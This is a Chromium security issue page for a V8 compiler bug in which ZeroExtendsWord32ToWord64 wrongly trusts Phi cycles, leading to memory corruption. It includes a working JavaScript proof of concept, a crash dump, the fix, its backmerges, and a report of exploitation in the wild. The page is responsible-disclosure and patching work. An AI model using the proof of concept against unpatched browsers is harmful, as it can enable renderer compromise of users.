# Improper optimization of ZeroExtendsWord32ToWord64() leads to Memory Corruption

| Field | Value |
|-------|-------|
| **Issue ID** | [356196918](https://issues.chromium.org/issues/356196918) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>JavaScript, Blink>JavaScript>API, Blink>JavaScript>Compiler>Turbofan, Blink>JavaScript>Runtime |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | ch...@gmail.com |
| **Assignee** | se...@microsoft.com |
| **Created** | 2024-07-30 |
| **Bounty** | $11,000.00 |

## Description

Security Bug

Important: Please do not change the component of this bug manually.

Please READ THIS FAQ before filing a bug: <https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md>

Please see the following link for instructions on filing security bugs: <https://www.chromium.org/Home/chromium-security/reporting-security-bugs>

Reports may be eligible for reward payments under the Chrome VRP: <https://g.co/chrome/vrp>

NOTE: Security bugs are normally made public once a fix has been widely deployed.

---

VULNERABILITY DETAILS

`VisitSwitch()` is used to select instructions for the Switch operation. When using jump table to implement switch, a 64-bit value is used as the index of the jump table, so the high 32 bits of the input node need to be extended by 00 to ensure that it does not cross the boundary.

`VisitSwitch()` will call `ZeroExtendsWord32ToWord64()` to determine whether the upper 32 bits of the input node have been extended to 00. If the function returns `True`, then the redundant `kX64Movl` will no longer be generated.

```
template <typename Adapter>
void InstructionSelectorT<Adapter>::VisitSwitch(node_t node,
                                                const SwitchInfo& sw) {
  X64OperandGeneratorT<Adapter> g(this);
  InstructionOperand value_operand = g.UseRegister(this->input_at(node, 0));

  // Either generate ArchTableSwitch directive or generate ArchBinarySearchSwitch directive
  if (enable_switch_jump_table_ == InstructionSelector::kEnableSwitchJumpTable) {    // Support switch jump table
    static const size_t kMaxTableSwitchValueRange = 2 << 16;
    size_t table_space_cost = 4 + sw.value_range();    // The range of index values
    size_t table_time_cost = 3;
    size_t lookup_space_cost = 3 + 2 * sw.case_count();    // How many cases are there?
    size_t lookup_time_cost = sw.case_count();
    if (sw.case_count() > 4 &&    // Number of branches > 4
        table_space_cost + 3 * table_time_cost <= lookup_space_cost + 3 * lookup_time_cost && // The cost of jump table is less than the cost of binary search.
        sw.min_value() > std::numeric_limits<int32_t>::min() &&    // min_value > Minimum value of int32
        sw.value_range() <= kMaxTableSwitchValueRange) {    // Value range <= maximum range of table jump
      InstructionOperand index_operand = g.TempRegister();

      // The high 32 bits of the index are extended by 00, because the 64-bit index will be used as the jump table index.
      if (sw.min_value()) {    // If the minimum value of index is not 0
        // Lea32 will automatically perform zero extension, and the result is a valid 64-bit index
        Emit(kX64Lea32 | AddressingModeField::encode(kMode_MRI), index_operand,
             value_operand, g.TempImmediate(-sw.min_value()));
      } else {    // If the minimum value of index is 0
        if (ZeroExtendsWord32ToWord64(this->input_at(node, 0))) {    // <==== BUG Here
          // The input node value has been extended by 00, so value_operand is used directly as the 64-bit index.
          index_operand = value_operand;
        } else {    
          Emit(kX64Movl, index_operand, value_operand);
        }
      }
      return EmitTableSwitch(sw, index_operand);
    }
  }
  return EmitBinarySearchSwitch(sw, value_operand);
}


```

However, there is a bug in the judgment of `ZeroExtendsWord32ToWord64()`:

`ZeroExtendsWord32ToWord64()` is used to determine whether the high 32 bits of the node `node` have been extended by 00. This method will recurse when encountering a phi node. If the phi node being visited is encountered during recursion, it will optimistically assume that the node is guaranteed to have the high 32 bits extended by 00

```
#if V8_TARGET_ARCH_64_BIT
template <typename Adapter>
bool InstructionSelectorT<Adapter>::ZeroExtendsWord32ToWord64(
    node_t node, int recursion_depth) {
  // Limit recursion depth to avoid the possibility of stack overflow on very
  // large functions.
  const int kMaxRecursionDepth = 100;

  if (this->IsPhi(node)) {    // This node is a phi node
    Upper32BitsState current = phi_states_[this->id(node)];    // Get the status of the node
    if (current != Upper32BitsState::kNotYetChecked) {    // The node has been calculated.
      return current == Upper32BitsState::kUpperBitsGuaranteedZero;
    }

    // If the recursion level is too deep, return false
    if (recursion_depth >= kMaxRecursionDepth) {
      return false;
    }

    // Mark the current node so that we skip it if we recursively visit it
    // again. Or, said differently, we compute a largest fixed-point so we can
    // be optimistic when we hit cycles.
    phi_states_[this->id(node)] = Upper32BitsState::kUpperBitsGuaranteedZero;    // <=== BUG Here

    // Traverse all input nodes of the phi node
    int input_count = this->value_input_count(node);
    for (int i = 0; i < input_count; ++i) {
      node_t input = this->input_at(node, i); 
      // As long as the high 32 bits of any input node of phi are not extended to 00, then this phi node cannot guarantee the high 32 bits to be extended to 00.
      if (!ZeroExtendsWord32ToWord64(input, recursion_depth + 1)) {  
        phi_states_[this->id(node)] = Upper32BitsState::kNoGuarantee;
        return false;
      }
    }
    return true;
  }
  return ZeroExtendsWord32ToWord64NoPhis(node);
}
#endif  // V8_TARGET_ARCH_64_BIT

```

Assume that the structure of Turboshaft Node before instruction selection is as follows

```
103: Switch(89)
    |
    V  
89: Phi(85, 117) <------------------------------|
    |                                           |
    |                                           |
    |---->85: Phi(24, 28, 76, 69, 58, 68)       |
    |       |                                   |
    |       |--->24: Constant2                  |
    |       |                                   |
    |       |--->28: Phi(4, 89)                 |
    |                |                          |
    |                |---> 4: Constant0         |
    |                |                          |
    |                |--------------------------
    |
    |---->117: Phi(24, 89, 108, 69, 58, 68)
            |
            |->24: Constant
            |->89: Constant
            |->108: Load SMI

```

The process of calculating `ZeroExtendsWord32ToWord64(89)` when selecting the instruction for `Switch(89)` is as follows

- 89: Since 89 is a Phi node, it will mark `phi_states_[89] = kUpperBitsGuaranteedZero`, and then recursively traverse the input nodes
  - 85: Since 85 is also a Phi node, it will mark `phi_states_[85] = kUpperBitsGuaranteedZero`, and then recursively traverse the input nodes
    - 24: It is `Constant`, so it returns true
    - 28: Since it is a Phi node, it will mark `phi_states_[28] = kUpperBitsGuaranteedZero`, and then recursively traverse the input nodes
      - 4: It is `Constant0`, and it returns true
      - 89: Here we encounter the previously recursively accessed `Phi` node. Since we optimistically believe that `phi_states_[89] = kUpperBitsGuaranteedZero`, we believe that the high 32 bits of `89` are truncated to 00. However, the calculation for `89` is not completed. We mistakenly believe that the high 32 bits of node `28` are extended to 00. However, if the value of node `108: Load` is passed to node `28: Phi` through node `89: Phi`, the high 32 bits of the value are not actually extended to 00.

[Root cause](https://github.com/v8/v8/blob/2b549214f51aeb2c75314a14d4d07b4caffd9644/src/compiler/backend/instruction-selector.cc#L5687)

Due to the SMI-corrupting mechanism, after loading an SMI from memory, the SMI will be added with `cage_base` by default, so the upper 32 bits should not be extended by 00 by default.

When `ZeroExtendsWord32ToWord64()` recursively visits a Phi node and encounters a node being visited, it should not assume that the node is extended by 00. In order to ensure safety, it should be considered as non-00 extended.

If `ZeroExtendsWord32ToWord64()` encounters a node being accessed, it should not assume that the node is 00-extended, but should be considered not to be 00-extended for safety reasons.

`ZeroExtendsWord32ToWord64()` is not only used in `VisitSwitch()`. Because `ZeroExtendsWord32ToWord64()` will incorrectly optimize some high 32-bit 00 extension operations, this will cause some `ChangeUint32ToUint64` nodes to fail. Currently, I have only constructed a sample that causes memory corruption. Through some sophisticated exploits, this vulnerability may lead to RCE

VERSION
The vulnerability was introduced in [commit 5c0f7219bdb6793c4bb1f480f8ecce4acbb99139](https://github.com/v8/v8/commit/5c0f7219bdb6793c4bb1f480f8ecce4acbb99139)

REPRODUCTION CASE

POC:

```
let x = 1;
x = 0;

function opt() {
    let v4 = 0;
    for (let i = 0; i < 10; i++) {
        for(let j=0; j<6; j++) { 
            switch(v4) { 
                case 0:
                    v4 = 1;
                    break;
                case 1:
                    v4 = 2;
                    break;
                case 2:
                    v4 = 3;
                    break;
                case 3:
                    v4 = 4;
                    break;
                case 4:
                    v4 = x;
                    break;
            };
        }
    }
    return v4;
}

%PrepareFunctionForOptimization(opt);
print(opt());
print(opt());
%OptimizeFunctionOnNextCall(opt);
print(opt());

```

run as:

```
./d8 \
    --allow-natives-syntax \
    ./test.js

```

You will get a memory corruption:

```
Received signal 11 <unknown> 000000000000
./run.sh: line 6: 988335 Segmentation fault 

```

The instruction that caused the crash is located in the function generated by JIT

core dump: Note that `$rcx` is not a valid 64-bit index.

```
$rax   : 0x0               
$rbx   : 0x0000364f00040299  →  0x450040000100000d
$rcx   : 0x000017f500000000  →  0x0000000000040940
$rdx   : 0x5               
$rsp   : 0x00007fffffffc638  →  0x00007fffffffc670  →  0x00007fffffffc6d0  →  0x00007fffffffc6f8  →  0x00007fffffffc770  →  0x00007fffffffc7b0  →  0x00007fffffffccc0  →  0x00007fffffffcda0
$rbp   : 0x00007fffffffc670  →  0x00007fffffffc6d0  →  0x00007fffffffc6f8  →  0x00007fffffffc770  →  0x00007fffffffc7b0  →  0x00007fffffffccc0  →  0x00007fffffffcda0  →  0x00007fffffffcfc0
$rsi   : 0x000017f500298a79  →  0x9900000008002904
$rdi   : 0x000017f500000000  →  0x0000000000040940
$rip   : 0x00005555c01800e5  →  0x00801f0fca24ff41
$r8    : 0x000017f500000000  →  0x0000000000040940
$r9    : 0x000055556130ba90  →  0x1baddead0baddeaf
$r10   : 0x00005555c0180390  →  0x00005555c0180150  →  0xf98b4800000002b9
$r11   : 0x246             
$r12   : 0x0000364f000400b1  →  0xd600400200000009
$r13   : 0x000055556128f080  →  0x00005555601a6040  →  <Builtins_AdaptorWithBuiltinExitFrame+0> push rbp
$r14   : 0x000017f500000000  →  0x0000000000040940
$r15   : 0x00007fffffffc648  →  0x00005555601eb5dc  →  <Builtins_InterpreterEntryTrampoline+732> mov rcx, rax
$eflags: [zero CARRY parity ADJUST SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
....
   0x5555c01800d5                  cmp    ecx, 0x9
   0x5555c01800d8                  jae    0x5555c0180155
   0x5555c01800de                  lea    r10, [rip+0x2ab]        # 0x5555c0180390
 → 0x5555c01800e5                  jmp    QWORD PTR [r10+rcx*8]
   0x5555c01800e9                  nop    DWORD PTR [rax+0x0]
   0x5555c01800f0                  movabs rcx, 0x17f500298a79
   0x5555c01800fa                  mov    edi, DWORD PTR [rcx+0x13]
   0x5555c01800fd                  add    rdi, r14
   0x5555c0180100                  cmp    edi, 0x741

```

POC is tested on the following platforms

- CPU: x86\_64, AMD 5950x
- OS: Ubuntu 20.04.4 LTS
- v8: `b7e2046e322fb451feee7c324fb062933a7cb338`
- Compilation parameters of v8

```
v8_monolithic=true
is_component_build=false
v8_use_external_startup_data=false
target_cpu = "x64"

is_debug = false

v8_enable_sandbox = false
v8_enable_v8_checks=false
dcheck_always_on = false
v8_enable_verify_heap = false

v8_enable_backtrace = true
v8_enable_disassembler = true
v8_enable_object_print = true

```

CREDIT INFORMATION

Externally reported security bugs may appear in Chrome release notes. If this bug is included, how would you like to be credited?
Reporter credit: TheDog

## Timeline

### ch...@gmail.com (2024-07-30)

BUG Fix suggestion: When encountering a node being visited, a pessimistic estimate should be made:
Change the code:

```
...
phi_states_[this->id(node)] = Upper32BitsState::kUpperBitsGuaranteedZero;
...

```

to:

```
...
phi_states_[this->id(node)] = Upper32BitsState::kNoGuarantee;
...

```

### cl...@appspot.gserviceaccount.com (2024-07-30)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5148308064370688.

### 24...@project.gserviceaccount.com (2024-07-30)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the hotlistid:4801165.

### 24...@project.gserviceaccount.com (2024-07-30)

Automatically assigning owner based on suspected regression changelist https://chromium.googlesource.com/v8/v8/+/deb3adaf54499e37d9620d55485360bc169eb835 (Reland "[turboshaft] Optimize StructuralOptimizationReducer"

This is a reland of commit b130db32b52883339b8de39b33e934da2f3d3aa9

Original change's description:
> [turboshaft] Optimize StructuralOptimizationReducer
>
> The condition like `if(x==0)` may be optimized to `if(x)` by other
> reducers, we should take this condition into consideration in
> StructuralOptimizationReducer.
>
> Bug: v8:12783
> Change-Id: Id5110ca5c1fb3c52639ed40fa601a13927049241
> Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5066072
> Reviewed-by: Nico Hartmann <nicohartmann@chromium.org>
> Commit-Queue: Jianxiao Lu <jianxiao.lu@intel.com>
> Cr-Commit-Position: refs/heads/main@{#91538}

Bug: v8:12783
Change-Id: Ic7c1a1219bbdaca4263c144af5dc8c3b08974353
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5129397
Reviewed-by: Nico Hartmann <nicohartmann@chromium.org>
Commit-Queue: Jianxiao Lu <jianxiao.lu@intel.com>
Cr-Commit-Position: refs/heads/main@{#91589}
).

If this is incorrect, please let us know why and apply the hotlistid:5433122. If you aren't the correct owner for this issue, please unassign yourself as soon as possible so it can be re-triaged.

### 24...@project.gserviceaccount.com (2024-07-30)

Detailed Report: https://clusterfuzz.com/testcase?key=5148308064370688

Fuzzer: None
Job Type: linux_asan_d8_dbg
Platform Id: linux

Crash Type: Segv on unknown address
Crash Address: 
Crash State:
  Builtins_InterpreterEntryTrampoline
  Builtins_JSEntryTrampoline
  Builtins_JSEntry
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=91588:91589

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5148308064370688

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### pe...@google.com (2024-07-31)

Setting milestone because of s0/s1 severity.

### pe...@google.com (2024-07-31)

Setting Priority to P1 to match Severity s1. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### ar...@chromium.org (2024-08-06)

Hi @seth.brenith and @nicohartmann,

I'm following up on the security bug fix deployment. We aim to have a fix available to all users within 60 days, which would necessitate landing a fix within the first week or two. It has now been one week since that initial timeline.

@seth.brenith, could you please confirm that you are the correct assignee for this bug and that you are actively working on resolving it?

@nicohartmann, as a reviewer of the problematic code, could you please advise if you can assist in either reverting or implementing a forward fix for the identified patch?

Thank you,

Secondary Security Shepherd

### ar...@chromium.org (2024-08-06)

+CC @nicohartmann FYI.

### se...@microsoft.com (2024-08-06)

Thanks for following up. I'm investigating now.

### se...@microsoft.com (2024-08-06)

@ch...@gmail.com: Thanks a lot for the great report! I really appreciate that you went the extra mile to explain, with a nice diagram, exactly what went wrong when the repro case triggers the bug.

I've created a CL to fix this issue in main, as suggested in comment 2: <https://chromium-review.googlesource.com/c/v8/v8/+/5766478>

### ap...@google.com (2024-08-07)

Project: v8/v8
Branch: main

commit 780d5608bb8ab63a3cd4b5c4846a3ec41e21c1a8
Author: Seth Brenith <seth.brenith@microsoft.com>
Date:   Tue Aug 06 23:08:34 2024

    [compiler] Clear stale data for ZeroExtendsWord32ToWord64
    
    The first call to ZeroExtendsWord32ToWord64 produces a correct result,
    but leaves some incorrect values in phi_states_. To avoid incorrect
    behavior, we should clear those values when starting anew.
    
    I think that the performance impact of this change on compilation time
    should be small, because calls to ZeroExtendsWord32ToWord64 are
    infrequent. Here is a histogram showing, per function compiled in
    Octane, how often this new code is run:
    
    0: 74.7%
    1: 13.1%
    2: 6.3%
    3: 2.5%
    4 or 5: 1.7%
    6 to 9: 0.9%
    11 to 33: 0.8%
    
    Bug: 356196918
    Change-Id: I00a9e74652025bf8a32cb083a6e01c0273e44043
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5766478
    Commit-Queue: Seth Brenith <seth.brenith@microsoft.com>
    Reviewed-by: Nico Hartmann <nicohartmann@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#95528}

M       src/compiler/backend/instruction-selector.cc

https://chromium-review.googlesource.com/5766478


### 24...@project.gserviceaccount.com (2024-08-08)

ClusterFuzz testcase 5148308064370688 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=95527:95528

If this is incorrect, please add the hotlistid:5433040 and re-open the issue.

### pe...@google.com (2024-08-08)

This is sufficiently serious that it should be merged to extended stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M126. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
This is sufficiently serious that it should be merged to stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M127. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M128. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.

### pe...@google.com (2024-08-08)

Merge review required: M128 is already shipping to beta.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: harrysouders (Android), harrysouders (iOS), obenedict (ChromeOS), pbommana (Desktop)

### pe...@google.com (2024-08-08)

Merge review required: M127 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: eakpobaro (Android), eakpobaro (iOS), alonbajayo (ChromeOS), danielyip (Desktop)

### pe...@google.com (2024-08-08)

Merge review required: M126 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: eakpobaro (Android), eakpobaro (iOS), ceb (ChromeOS), srinivassista (Desktop)

### se...@microsoft.com (2024-08-09)

1. This is an important security issue (medium severity or higher).
2. <https://chromium-review.googlesource.com/c/v8/v8/+/5766478>
3. Yes, since 129.0.6644.0
4. No, it's not a new feature
5. N/A, not a Chrome OS change
6. No manual verification is required.

### am...@chromium.org (2024-08-12)

<https://crrev.com/c/5766478> approved for merge to M128 Beta
please merge this fix to 12.8 at soonest so this fix can be included in tomorrow's cut of M128 early stable and next beta

The last planned release of M127 is tomorrow and there are no further planned releases of M126, so there is no need to backmerge to those branches at this time.

### se...@microsoft.com (2024-08-12)

Okay, thanks! I've created a merge CL: <https://chromium-review.googlesource.com/c/v8/v8/+/5782657>

### pb...@google.com (2024-08-12)

Your Cl is already approved and requested to get the Cl or Cl's merged on or before Noon Tuesday i.e., Aug-13th-2024 so that it's part of Stable Cut. 

### ap...@google.com (2024-08-13)

Project: v8/v8
Branch: refs/branch-heads/12.8

commit 1ac90a0b0f77355c97ebf24635a61e29ed993e68
Author: Seth Brenith <seth.brenith@microsoft.com>
Date:   Tue Aug 06 23:08:34 2024

    Merged: [compiler] Clear stale data for ZeroExtendsWord32ToWord64
    
    The first call to ZeroExtendsWord32ToWord64 produces a correct result,
    but leaves some incorrect values in phi_states_. To avoid incorrect
    behavior, we should clear those values when starting anew.
    
    I think that the performance impact of this change on compilation time
    should be small, because calls to ZeroExtendsWord32ToWord64 are
    infrequent. Here is a histogram showing, per function compiled in
    Octane, how often this new code is run:
    
    0: 74.7%
    1: 13.1%
    2: 6.3%
    3: 2.5%
    4 or 5: 1.7%
    6 to 9: 0.9%
    11 to 33: 0.8%
    
    (cherry picked from commit 780d5608bb8ab63a3cd4b5c4846a3ec41e21c1a8)
    
    Bug: 356196918
    Change-Id: I00a9e74652025bf8a32cb083a6e01c0273e44043
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5766478
    Commit-Queue: Seth Brenith <seth.brenith@microsoft.com>
    Reviewed-by: Nico Hartmann <nicohartmann@chromium.org>
    Cr-Original-Commit-Position: refs/heads/main@{#95528}
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5782657
    Commit-Queue: Deepti Gandluri <gdeepti@chromium.org>
    Reviewed-by: Deepti Gandluri <gdeepti@chromium.org>
    Cr-Commit-Position: refs/branch-heads/12.8@{#20}
    Cr-Branched-From: 70cbb397b153166027e34c75adf8e7993858222e-refs/heads/12.8.374@{#1}
    Cr-Branched-From: 451b63ed4251c2b21c56144d8428f8be3331539b-refs/heads/main@{#95151}

M       src/compiler/backend/instruction-selector.cc

https://chromium-review.googlesource.com/5782657


### pe...@google.com (2024-08-13)

LTS Milestone M126

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### se...@microsoft.com (2024-08-14)

1. This is not a recent regression; the bug has been present since Chrome version 87. The specific repro case above has triggered the bug since Chrome version 122.
2. No

### pb...@google.com (2024-08-15)

The change has been merged to M128 branch as crrev.com/c/5782657, hence dropping Approved-128 label.

### sp...@google.com (2024-08-15)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $11000.00 for this report.

Rationale for this decision:
$10,000 for high quality report of memory corruption in a sandboxed process / the renderer + $1,000 bisect bonus


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2024-08-16)

Congratulations TheDog! Thank you for your efforts and reporting this issue to us -- nice work!

### am...@chromium.org (2024-08-23)

We have received information that this bug is under active ITW exploitation.
Chrome active release channels are already covered as M128 is not Stable and Extended Stable channels.

Awaiting updated information about what versions are being targeted, but suffice to say since this bug impacts back to at least M126, ChromeOS-LTS and other backport considerations for embedders can begin there.

### ap...@google.com (2024-08-26)

Project: v8/v8
Branch: refs/branch-heads/12.7

commit bd5ec8a926ecefb8fa37e435dbc0d2f46b9b03c8
Author: Seth Brenith <seth.brenith@microsoft.com>
Date:   Tue Aug 06 23:08:34 2024

    [M127][compiler] Clear stale data for ZeroExtendsWord32ToWord64
    
    The first call to ZeroExtendsWord32ToWord64 produces a correct result,
    but leaves some incorrect values in phi_states_. To avoid incorrect
    behavior, we should clear those values when starting anew.
    
    I think that the performance impact of this change on compilation time
    should be small, because calls to ZeroExtendsWord32ToWord64 are
    infrequent. Here is a histogram showing, per function compiled in
    Octane, how often this new code is run:
    
    0: 74.7%
    1: 13.1%
    2: 6.3%
    3: 2.5%
    4 or 5: 1.7%
    6 to 9: 0.9%
    11 to 33: 0.8%
    
    (cherry picked from commit 780d5608bb8ab63a3cd4b5c4846a3ec41e21c1a8)
    
    Bug: 356196918
    Change-Id: I00a9e74652025bf8a32cb083a6e01c0273e44043
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5766478
    Commit-Queue: Seth Brenith <seth.brenith@microsoft.com>
    Cr-Original-Commit-Position: refs/heads/main@{#95528}
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5809258
    Commit-Queue: Thibaud Michaud <thibaudm@chromium.org>
    Reviewed-by: Seth Brenith <seth.brenith@microsoft.com>
    Auto-Submit: Roger Felipe Zanoni da Silva (xWF) <rzanoni@google.com>
    Reviewed-by: Thibaud Michaud <thibaudm@chromium.org>
    Cr-Commit-Position: refs/branch-heads/12.7@{#38}
    Cr-Branched-From: 35cc908918d3f8083955ed8328506f964e17ae40-refs/heads/12.7.224@{#1}
    Cr-Branched-From: 6d60e6734b32211215c8410db6fe2b84b13abe0e-refs/heads/main@{#94324}

M       src/compiler/backend/instruction-selector.cc

https://chromium-review.googlesource.com/5809258


### ap...@google.com (2024-08-26)

Project: v8/v8
Branch: chromium/6099_318

commit 8302e3d79bc1cf84f6939a58796960e034bbeb6f
Author: Seth Brenith <seth.brenith@microsoft.com>
Date:   Tue Aug 06 23:08:34 2024

    [M126][compiler] Clear stale data for ZeroExtendsWord32ToWord64
    
    The first call to ZeroExtendsWord32ToWord64 produces a correct result,
    but leaves some incorrect values in phi_states_. To avoid incorrect
    behavior, we should clear those values when starting anew.
    
    I think that the performance impact of this change on compilation time
    should be small, because calls to ZeroExtendsWord32ToWord64 are
    infrequent. Here is a histogram showing, per function compiled in
    Octane, how often this new code is run:
    
    0: 74.7%
    1: 13.1%
    2: 6.3%
    3: 2.5%
    4 or 5: 1.7%
    6 to 9: 0.9%
    11 to 33: 0.8%
    
    Bug: 356196918
    Change-Id: I00a9e74652025bf8a32cb083a6e01c0273e44043
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5766478
    Commit-Queue: Seth Brenith <seth.brenith@microsoft.com>
    Cr-Commit-Position: refs/heads/main@{#95528}
    (cherry picked from commit 780d5608bb8ab63a3cd4b5c4846a3ec41e21c1a8)
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5803612
    Reviewed-by: Nico Hartmann <nicohartmann@chromium.org>
    Commit-Queue: Roger Felipe Zanoni da Silva (xWF) <rzanoni@google.com>
    Auto-Submit: Roger Felipe Zanoni da Silva (xWF) <rzanoni@google.com>
    Reviewed-by: Seth Brenith <seth.brenith@microsoft.com>

M       src/compiler/backend/instruction-selector.cc

https://chromium-review.googlesource.com/5803612


### pe...@google.com (2024-08-26)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### pe...@google.com (2024-08-26)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### rz...@google.com (2024-08-26)

1. <https://crrev.com/c/5807474> for 126, <https://chromium-review.googlesource.com/c/v8/v8/+/5789878> for 120
2. Low, no conflicts
3. 128
4. Yes

### ap...@google.com (2024-08-27)

Project: v8/v8
Branch: refs/branch-heads/12.6

commit 79c429b44b69b92033c7c132b4ceeadc9205c3b8
Author: Seth Brenith <seth.brenith@microsoft.com>
Date:   Tue Aug 06 23:08:34 2024

    [M126-LTS][compiler] Clear stale data for ZeroExtendsWord32ToWord64
    
    The first call to ZeroExtendsWord32ToWord64 produces a correct result,
    but leaves some incorrect values in phi_states_. To avoid incorrect
    behavior, we should clear those values when starting anew.
    
    I think that the performance impact of this change on compilation time
    should be small, because calls to ZeroExtendsWord32ToWord64 are
    infrequent. Here is a histogram showing, per function compiled in
    Octane, how often this new code is run:
    
    0: 74.7%
    1: 13.1%
    2: 6.3%
    3: 2.5%
    4 or 5: 1.7%
    6 to 9: 0.9%
    11 to 33: 0.8%
    
    (cherry picked from commit 780d5608bb8ab63a3cd4b5c4846a3ec41e21c1a8)
    
    Bug: 356196918
    Change-Id: I00a9e74652025bf8a32cb083a6e01c0273e44043
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5766478
    Commit-Queue: Seth Brenith <seth.brenith@microsoft.com>
    Cr-Original-Commit-Position: refs/heads/main@{#95528}
